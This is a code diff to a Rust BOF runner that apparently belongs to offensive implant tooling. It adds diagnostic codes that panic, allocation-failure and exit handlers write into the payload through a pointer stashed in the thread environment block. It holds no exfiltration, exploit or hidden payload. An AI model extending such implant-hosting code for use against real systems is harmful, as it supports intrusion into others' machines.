@@ -70,13 +70,15 @@ static ALLOC: minialloc::ProcessHeapAlloc = minialloc::ProcessHeapAlloc;
 
 #[panic_handler]
 fn _panic(_info: &core::panic::PanicInfo) -> ! {
-    // panic = abort (profile). A spin pins a core in the sacrificial child —
-    // prefer a clean exit; the parent maps the non-zero code to an error.
+    // Stamp 0xC1 into the payload blob_len field (probe-readable diag),
+    // then prefer a clean exit; the parent maps the non-zero code to error.
+    stamp_diag(0xC1);
     exit_process(0xC000_0001);
 }
 
 #[alloc_error_handler]
 fn _alloc_error(_layout: core::alloc::Layout) -> ! {
+    stamp_diag(0xC2);
     // Mirrors the implant shell's dedicated OOM exit code (0xAD).
     exit_process(0xAD);
 }
@@ -88,7 +90,8 @@ fn exit_process(code: u32) -> ! {
         let f: extern "system" fn(usize, i32) -> i32 = unsafe { core::mem::transmute(addr) };
         let _ = unsafe { f(!0usize, code as i32) };
     }
-    // Defensive trap — only reached if ntdll is gone (catastrophic).
+    // Defensive trap — only reached if resolution failed (catastrophic).
+    stamp_diag(0xC3);
     loop {
         core::hint::spin_loop();
     }
@@ -175,9 +178,35 @@ unsafe fn set_stage(packed: *const u8, base_off: usize, stage: u64) {
     unsafe { len_slot.write_unaligned(stage as u32) };
 }
 
+/// Write a diagnostic marker to the payload's blob_len field via the packed
+/// pointer stashed at gs:[0x1790] (probe-readable; zero-layout channel).
+fn stamp_diag(v: u32) {
+    let packed: usize;
+    unsafe {
+        core::arch::asm!(
+            "mov {}, gs:[0x1790]",
+            out(reg) packed,
+            options(nostack, preserves_flags, readonly),
+        );
+    }
+    if packed != 0 {
+        unsafe { (packed as *mut u32).write_unaligned(v) };
+    }
+}
+
 /// Parse the packed payload, stash the args pointer for the dataparse
 /// fallback, and run the BOF. Returns the ExitProcess code.
 unsafe fn entry_run(packed: *const u8) -> u32 {
+    // Diagnostic stash: packed at gs:[0x1790] so panic/alloc/exit handlers
+    // can stamp the payload's blob_len field (probe-readable) without TEB
+    // base lookups.
+    unsafe {
+        core::arch::asm!(
+            "mov qword ptr gs:[0x1790], {}",
+            in(reg) packed as usize,
+            options(nostack, preserves_flags),
+        );
+    }
     if packed.is_null() {
         shim::write_line(b"[bof-host] null payload pointer");
         return 1;
